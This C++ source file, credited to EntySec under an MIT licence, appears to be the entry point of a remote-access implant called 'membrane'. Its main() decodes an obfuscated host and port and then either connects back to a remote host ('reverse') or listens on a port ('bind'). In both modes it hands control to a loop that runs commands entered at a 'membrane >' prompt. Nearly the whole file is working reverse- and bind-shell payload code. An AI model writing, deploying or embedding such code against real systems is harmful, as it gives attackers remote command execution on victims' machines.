/*
* MIT License
*
* Copyright (c) 2020-2021 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#include "crypto.hpp"

void repeater()
{
    while (1) {
        console_log("membrane > ", 0);

        std::vector<std::string> commands = membrane_read();
        if (commands.empty())
            continue;
        else {
            if (commands[0] == "exit")
                break;

            if (membrane_execute(commands) < 0)
                console_log_error("Unrecognized command!");
        }
    }
}

int main(int argc, char *argv[])
{
    if (argc > 1) {
        std::string host, port;

        if (std::string(argv[1]) == "reverse") {
            if (argc >= 4) {
                host = crypto(std::string(argv[2]));
                port = crypto(std::string(argv[3]));
            } else if (argc >= 3) {
                host = "127.0.0.1";
                port = crypto(std::string(argv[2]));
            } else
                return -1;

            int sock = membrane_connect(host, std::stoi(port));
            if (sock >= 0)
                repeater();

            close(sock);
        } else if (std::string(argv[1]) == "bind") {
            if (argc >= 3)
                port = crypto(std::string(argv[2]));
            else
                return -1;

            int sock = membrane_listen(std::stoi(port));
            if (sock >= 0)
                repeater();

            close(sock);
        }
    } else
        return -1;
    return 0;
}
